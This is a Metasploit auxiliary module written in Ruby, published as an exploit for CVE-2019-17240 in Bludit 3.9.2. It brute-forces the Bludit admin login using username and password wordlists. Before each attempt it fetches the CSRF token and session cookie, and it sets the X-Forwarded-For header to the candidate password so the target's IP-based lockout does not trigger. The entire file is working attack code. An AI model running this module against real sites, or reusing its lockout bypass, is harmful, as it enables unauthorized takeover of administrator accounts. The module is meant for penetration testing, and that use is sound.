##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
# Exploit Title: Bludit Brute Force Attack 3.9.2 (Metasploit)
# Google Dork: N/A
# Date: June 7 2020
# Exploit Author: Eren Şimşek <Aporlorxl23>
# Vendor Homepage: https://www.bludit.com/
# Software Link: https://github.com/bludit/bludit
# Version: 3.9.2
# Tested on: Kali Linux Amd64
# CVE : 2019-17240
##

class MetasploitModule < Msf::Auxiliary
    include Msf::Exploit::Remote::HttpClient
  
    def initialize
      super(
        'Name'        => 'Bludit Panel Brute force',
        'Description' => %q{
            This Module performs brute force attack on Bludit Panel.
          },
        'Author'      => 'Eren Simsek <egtorteam@gmail.com>',
        'License'     => MSF_LICENSE,
        'DisclosureDate' => 'June 7 2020')
      register_options(
        [
          OptString.new('TARGETURI', [ true, 'Bludit Panel Uri', 'admin']),
          OptString.new('USERNAME', [ false, 'Bludit account username']),
          OptString.new('PASSWORD', [ false, 'Bludit account password']),
          OptPath.new('USER_FILE', [ false, 'The User wordlist path']),
          OptPath.new('PASS_FILE', [ false, 'The Pass wordlist path']),
          OptBool.new('USER_AS_PASS', [ false, 'Try the username as the password for all users']),
        ])
    end
    def check_variable
      if datastore["USERNAME"] != nil
        if datastore["USER_FILE"] != nil
          raise Msf::OptionValidateError.new(['USER_FILE'])
        end
      end
      if datastore["PASSWORD"] != nil
        if datastore["PASS_FILE"] != nil
          raise Msf::OptionValidateError.new(['PASS_FILE'])
        end
      end
      if datastore["USER_FILE"] != nil
        if datastore["USERNAME"] != nil
          raise Msf::OptionValidateError.new(['USERNAME'])
        end
      end
      if datastore["PASS_FILE"] != nil
        if datastore["PASSWORD"] != nil
          raise Msf::OptionValidateError.new(['PASSWORD'])
        end
      end
    end
    @signed = false
    def brute_force(username,password)
      res = send_request_cgi({
        'uri' => normalize_uri(target_uri.path,'/'),
        'method' => 'GET',
      })
      #Send request target website
      username = username.strip
      password = password.strip
      #strip command remove spaces
      bluditkey = res.get_cookies
      #Send request target website and get cookies
      csrf = res.body.scan(/<input type="hidden" id="jstokenCSRF" name="tokenCSRF" value="(.*?)">/).flatten[0] || ''
      #Get CSRF Token
      if bluditkey == nil #if cookies not found
        fail_with(Failure::UnexpectedReply, "Cookie Not Found !")
      end
      if csrf == nil #if csrf token not found
        fail_with(Failure::UnexpectedReply, "CSRF Not Found !")
      end
      print_warning("Trying #{username}:#{password}")
      res = send_request_cgi({
        'uri' => normalize_uri(target_uri.path,'/'),
        'method' => 'POST',
        'cookie' => bluditkey,
        'headers' => {
          'X-Forwarded-For' => password, #host injected and unblock ip address
          'User-Agent' => 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',
          'Referer' => normalize_uri(target_uri.path,'/'),
        },
        'vars_post' => { #post method variables
          'tokenCSRF' => csrf,
          'username' => username,
          'password' => password,
          'save' => '',
        },
      })
      if res && res.code != 200 #if request cod not 200 ok 
        if res && res.headers['Location'] == '/admin/dashboard' #if signed web site
          print_good("Found #{username}:#{password}")
          @signed = true
        else #request not 200 error
          fail_with(Failure::UnexpectedReply, " Request Not Success Code #{res.code}")
        end
      end
    end
    def run
      check_variable #check variable, not use user_file if use username
      res = send_request_cgi({
        'uri' => normalize_uri(target_uri.path,'/'),
        'method' => 'GET',
      })
      if res && res.code == 200
        vprint_status("Request 200 OK")
      else
        fail_with(Failure::UnexpectedReply, "Request Not Success Code #{res.code}")
      end
      if datastore["USERNAME"] != nil && datastore["PASS_FILE"] != nil
        unless ::File.exist?(datastore['PASS_FILE'])
          #check file exit, error not found if not exist file
          fail_with Failure::NotFound, "PASS_FILE #{datastore['PASS_FILE']} does not exists!"
        end
        @wordlist = ::File.open(datastore["PASS_FILE"],"rb")
        #open pass_file
        @wordlist.each_line do |password|
          #each line on wordlist
          password = password.strip # remove spaces 
          if !@signed # continue if signed false
            brute_force(datastore["USERNAME"],password)
          end
        end
      end
      if datastore["USER_FILE"] != nil && datastore["PASSWORD"] != nil
        unless ::File.exist?(datastore['USER_FILE'])
          fail_with Failure::NotFound, "USER_FILE #{datastore['USER_FILE']} does not exists!"
        end
        @wordlist = ::File.open(datastore["USER_FILE"],"rb")
        @wordlist.each_line do |username|
          username = username.strip
          if !@signed
            brute_force(username,datastore["PASSWORD"])
          end
        end
      end
      if datastore["USER_FILE"] != nil && datastore["PASS_FILE"] != nil
        unless ::File.exist?(datastore['USER_FILE'])
          fail_with Failure::NotFound, "USER_FILE #{datastore['USER_FILE']} does not exists!"
        end
        unless ::File.exist?(datastore['PASS_FILE'])
          fail_with Failure::NotFound, "PASS_FILE #{datastore['PASS_FILE']} does not exists!"
        end
        @userlist = ::File.open(datastore["USER_FILE"],"rb")
        @userlist.each_line do |username|
          username = username.strip
          @passlist = ::File.open(datastore["PASS_FILE"],"rb")
          @passlist.each_line do |password|
            password = password.strip
            if !@signed
              brute_force(username,password)
            end
          end
        end
      end
      if datastore["USER_FILE"] != nil && datastore["USER_AS_PASS"] == true && datastore["PASS_FILE"] == nil
        unless ::File.exist?(datastore['USER_FILE'])
          fail_with Failure::NotFound, "USER_FILE #{datastore['USER_FILE']} does not exist!"
        end
        @userlist = ::File.open(datastore["USER_FILE"],"rb")
        @userlist.each_line do |username|
          username = username.strip
          @passlist = ::File.open(datastore["USER_FILE"],"rb")
          @passlist.each_line do |password|
            password = password.strip
            if !@signed
              brute_force(username,password)
            end
          end
        end
      end
    end
end
  
